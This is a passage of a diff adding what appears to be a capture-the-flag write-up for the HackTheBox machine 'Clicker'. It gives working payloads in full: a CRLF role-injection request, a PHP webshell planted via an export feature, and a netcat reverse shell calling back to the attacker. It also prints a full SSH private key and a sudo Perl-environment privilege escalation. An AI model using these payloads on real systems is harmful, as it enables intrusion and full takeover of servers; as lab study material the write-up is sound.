+	header('Location: /index.php?msg=Game has been saved!');
+	
+}
+```
+
+## Exploitation
+
+I ended up using a CRLF to bypass the filter with the following request:
+
+```
+GET /save_game.php?clicks=11&level=111&role%0a=Admin HTTP/1.1
+Host: clicker.htb
+```
+
+I then (which has me stalled for a, surprisingly long time...) had to log in and out to visit `admin.php` properly.
+
+![Admin](/images/htb/medium/clicker/admin.png)
+
+Once inside I saw we could export a list of users as JSON, TXT or HTML.
+
+Looking at the source of `exports.php` no extension filtering occurs, so we can create a `.php` file, now we just have to put a shell in.
+
+```php
+...
+$filename = "exports/top_players_" . random_string(8) . "." . $_POST["extension"];
+...
+```
+
+Looking back at our parameter injection code, we can insert a new value for the `nickname` parameter post-registration which is a [tiny PHP webshell](https://github.com/bayufedra/Tiny-PHP-Webshell#simple-http-requests-get-method-shell).
+
+```
+GET /save_game.php?clicks=8794732211&level=11&nickname=<?=`$_GET[0]`?>&role%0a=Admin HTTP/1.1
+Host: clicker.htb
+```
+
+I now generate a new export with the `.php` extension.
+
+```
+POST /export.php HTTP/1.1
+Host: clicker.htb
+
+threshold=1&extension=php
+```
+
+Visiting the export gives us a mostly blank page, until we use `?0=whoami` in the paramter and we get this!
+
+`www-data 	8794732211 	11`
+
+## Inital Access
+
+I then created a URL encoded reverse shell from [revshells.com](https://revshells.com):
+
+`?0=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%2010.10.***.***%204444%20%3E%2Ftmp%2Ff`
+
+And setup a listener locally using `pwncat`.
+
+```
+$ pwncat-cs
+[16:41:49] Welcome to pwncat 🐈!
+(local) pwncat$ listen --host 10.10.***.*** 4444 -m linux
+[16:41:53] new listener created for 10.10.***.***:4444
+(local) pwncat$
+```
+
+And we get a response!
+
+```
+[05:17:22] 10.10.11.232:51072: upgrading from /usr/sbin/nologin to /usr/bin/bash
+[05:17:23] 10.10.11.232:51072: registered new host w/ db
+[05:17:24] listener: 10.10.16.9:4444: linux session from 10.10.11.232:51072
+           established
+```
+
+## User Flag
+
+Looking for files owned by the user `jack` (seen in the `/home` directory) shows some interesting results in the `/opt` folder.
+
+```
+$ find / -user jack 2>/dev/null
+/home/jack
+/opt/manage
+/opt/manage/README.txt
+/opt/manage/execute_query
+$ ls /opt/manage
+README.txt execute_query
+$ cat README.txt
+Web application Management
+
+Use the binary to execute the following task:
+	- 1: Creates the database structure and adds user admin
+	- 2: Creates fake players (better not tell anyone)
+	- 3: Resets the admin password
+	- 4: Deletes all users except the admin
+```
+
+After, **alot** of time... I found using values <4 for the binary input is a read file function, so we can read the SSH keys of `jack` by doing this:
+
+```
+$ ./execute_query 5 ../.ssh/id_rsa
+mysql: [Warning] Using a password on the command line interface can be insecure.
+--------------
+-----BEGIN OPENSSH PRIVATE KEY---
+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
+-----END OPENSSH PRIVATE KEY---
+--------------
+
+ERROR 1064 (42000) at line 1: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '-----BEGIN OPENSSH PRIVATE KEY---
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAA' at line 1
+```
+
+I put the key into `jack.key` on my local machine and ran the following:
+
+```
+$ chmod 600 jack.key
+$ ssh jack@clicker.htb -i jack.key
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-84-generic x86_64)
+...
+-bash-5.1$ cat user.txt
+52451aacf5ceeb84caf5355fe3d2d30f
+```
+
+And there's our user flag! <mark>52451aacf5ceeb84caf5355fe3d2d30f</mark>
+
+## Root Flag
+
+Running `sudo -l` gives us some entries:
+
+```
+$ sudo -l
+Matching Defaults entries for jack on clicker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User jack may run the following commands on clicker:
+    (ALL : ALL) ALL
+    (root) SETENV: NOPASSWD: /opt/monitor.sh
+```
+
+Looking at the contents of `/opt/monitor.sh` we see this:
+
+```sh
+#!/bin/bash
+if [ "$EUID" -ne 0 ]
+  then echo "Error, please run as root"
+  exit
+fi
+
+set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+unset PERL5LIB;
+unset PERLLIB;
+
+data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
+/usr/bin/xml_pp <<< $data;
+if [[ $NOSAVE == "true" ]]; then
+    exit;
+else
+    timestamp=$(/usr/bin/date +%s)
+    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
+fi
+```
+
+Looking at `PERL5LIB` being unset, and looking inside `/usr/bin/xml_pp`, I assume this is vulnerable to [CVE-2016-1531](https://github.com/0xsyr0/OSCP#cve-2016-1531-exim-lpe)
+
+As we can't write any files to the directory, we can do it by setting a SUID to `/bin/bash`
+
+```
+$ sudo PERL5OPT=-d PERL5DB='exec "chmod u+s /bin/bash"' /opt/monitor.sh
+Statement unlikely to be reached at /usr/bin/xml_pp line 9.
+	(Maybe you meant system() when you said exec()?)
+$ /bin/bash -p
+$ cat /root/root.txt
+59e97b75b4b6daac788914d2ece50c4c
+```
+
+And there's the root flag! <mark>59e97b75b4b6daac788914d2ece50c4c</mark>
+
+
+Success!
+
+![Success](/images/htb/medium/clicker/submitted.png)
+
+## Thanks for reading!
+Feel free to give me feedback or follow me on [Twitter](https://twitter.com/sealldev).
